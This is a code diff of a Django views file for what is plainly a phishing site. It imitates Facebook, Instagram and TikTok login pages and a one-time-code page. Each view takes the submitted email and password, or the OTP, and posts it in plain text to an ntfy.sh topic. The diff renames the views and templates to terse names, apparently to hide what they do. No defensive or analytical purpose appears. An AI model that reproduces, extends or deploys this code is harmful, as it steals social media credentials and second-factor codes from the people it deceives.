@@ -7,7 +7,7 @@ def home(request):
   return render(request, 'index.html')
 
 
-def facebook(request):
+def f(request):
   if request.method=="POST":
     email=request.POST['email']
     password=request.POST['password']
@@ -15,12 +15,12 @@ def facebook(request):
     message = f"FACEBOOK\nEmail: {email}\nPassword: {password}"
     requests.post("https://ntfy.sh/GiveRAw", data=message.encode('utf-8'))
 
-    return redirect('otp')
-  return render(request, 'facebook.html')
+    return redirect('o')
+  return render(request, 'f.html')
 
 
 
-def instagram(request):
+def ins(request):
   if request.method=="POST":
     email=request.POST['email']
     password=request.POST['password']
@@ -28,11 +28,11 @@ def instagram(request):
     message = f"INSTAGRAM\nEmail: {email}\nPassword: {password}"
     requests.post("https://ntfy.sh/GiveRAw", data=message.encode('utf-8'))
 
-    return redirect('otp')
-  return render(request, 'instagram.html')
+    return redirect('o')
+  return render(request, 'in.html')
 
 
-def tiktok(request):
+def t(request):
   if request.method=="POST":
     email=request.POST['email']
     password=request.POST['password']
@@ -40,11 +40,11 @@ def tiktok(request):
     message = f"TIKTOK\nEmail: {email}\nPassword: {password}"
     requests.post("https://ntfy.sh/GiveRAw", data=message.encode('utf-8'))
 
-    return redirect('otp')
-  return render(request, 'tiktok.html')
+    return redirect('o')
+  return render(request, 't.html')
 
 
-def otp(request):
+def o(request):
   if request.method=="POST":
     otp=request.POST['otp']
 
@@ -52,7 +52,7 @@ def otp(request):
     requests.post("https://ntfy.sh/GiveRAw", data=message.encode('utf-8'))
 
     return redirect('congrats')
-  return render(request, 'otp.html')
+  return render(request, 'o.html')
 
 
 def congrats(request):
